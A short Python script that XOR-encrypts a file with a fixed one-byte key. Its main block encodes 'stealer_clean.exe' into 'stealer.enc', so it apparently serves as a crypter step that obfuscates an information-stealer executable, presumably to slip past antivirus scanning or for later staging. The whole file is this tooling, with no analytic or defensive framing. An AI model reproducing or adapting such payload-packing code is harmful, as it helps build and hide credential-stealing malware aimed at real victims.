#!/usr/bin/env python3

import sys

XOR_KEY = 0x5A

def encrypt_file(input_file, output_file):
    """Encrypt file with XOR key"""
    with open(input_file, 'rb') as f:
        data = f.read()
    
    encrypted = bytes([b ^ XOR_KEY for b in data])
    
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    
    print(f"✅ Encrypted {input_file} -> {output_file}")
    print(f"📊 Size: {len(encrypted)} bytes")

if __name__ == "__main__":
    encrypt_file("stealer_clean.exe", "stealer.enc")
